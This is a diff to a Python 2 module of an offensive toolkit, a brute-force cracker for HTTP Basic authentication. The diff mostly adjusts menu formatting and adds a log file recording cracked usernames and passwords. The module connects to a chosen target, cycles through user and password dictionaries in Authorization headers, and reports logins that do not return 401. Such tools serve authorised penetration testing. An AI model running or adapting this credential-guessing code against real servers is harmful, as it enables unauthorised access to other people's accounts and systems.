@@ -2,9 +2,11 @@
 # Brute Force HTTP Authentication
 # Script by RedToor
 # 27/02/2015
+
+from core import help
+import time
 import socket
 import base64
-from core import help
 W  = '\033[0m'  
 R  = '\033[31m' 
 G  = '\033[32m' 
@@ -20,24 +22,27 @@ defaultdic1="core/db/user.dicc"
 defaultdic2="core/db/pass.dicc"
 def httpbt():
 	global defaulthost,defaultport,defaultpach,defaultdic1,defaultdic2
-	actions = raw_input(B+"   web/httpbt > "+W)
+	actions = raw_input(O+"     ktn/web/httpbt > "+W)
 	if actions == "show options":
+		print ""
 		print "     ["+R+"+"+W+"] options"
-		print "     target         : yes"
-		print "     port           : no/yes"
-		print "     patch          : no/yes"
-		print "     dictionaries   : no/yes\n"
+		print "     |target         : yes"
+		print "     |port           : no/yes"
+		print "     |patch          : no/yes"
+		print "     |dictionaries   : no/yes\n"
+		print ""
 		print "     ["+G+"+"+W+"] options current"
-		print "     target         : ",defaulthost
-		print "     port           : ",defaultport
-		print "     patch          : ",defaultpach
-		print "     dictionary_1   : ",defaultdic1
-		print "     dictionary_2   : ",defaultdic2
+		print "     |target         : ",defaulthost
+		print "     |port           : ",defaultport
+		print "     |patch          : ",defaultpach
+		print "     |dictionary_1   : ",defaultdic1
+		print "     |dictionary_2   : ",defaultdic2
+		print ""
 		httpbt()
 	elif actions=="back":
-		return 
+		exit()
 	elif actions=="exit":
-		print C+"   GooD"+W+" bye."
+		print C+"     GooD"+W+" bye."
 		exit()
 	elif actions[0:10] == "set target":
 			defaulthost = actions[11:]
@@ -70,7 +75,7 @@ def httpbt():
 			print "     patch          : "+defaultpach
 			print "     dictionary_1   : "+defaultdic1
 			print "     dictionary_2   : "+defaultdic2
-			print  
+			print ""
 			try:
 				red=socket.socket(socket.AF_INET, socket.SOCK_STREAM)       
 				red.connect((defaulthost, int(defaultport))) 
@@ -89,7 +94,16 @@ def httpbt():
 										red.send("Authorization:Basic "+base64.b64encode(us+":"+ps)+"\r\n\r\n")  
 										last=red.recv(1000)	
 										if last.find("401")<=0:
-											print "     ["+G+"+"+W+"] SUCCESSFUL with user: "+us+" , pass: "+ps+"\n"
+											log=open('core/logs/logsBruteForce.log','a')
+											log.write('\n ===================================== ')
+											log.write('\n Module  : BruteForceHTTP')
+											log.write('\n Data    : '+time.strftime('%c'))
+											log.write('\n target  : '+defaulthost)
+											log.write('\n port    : '+defaultport)
+											log.write('\n patch   : '+defaultpach)
+											log.write('\n Cracked : username : '+us+' , password : '+ps)
+											log.close()
+											print "     ["+G+"+"+W+"] Successfully with user: "+us+" , pass: "+ps+"\n"
 											red.close
 											httpbt()
 										else:
@@ -98,5 +112,7 @@ def httpbt():
 					except(KeyboardInterrupt, SystemExit):
 						print("   ["+O+"!"+W+"] (Ctrl + C) Detected, System Exit")
 			except:
-				print("     ["+R+"-"+W+"] target DEAD")
+				print("     ["+R+"-"+W+"] target off")
+	else:
+		print "     ["+O+"!"+W+"] command No Accept"+W
 	httpbt()
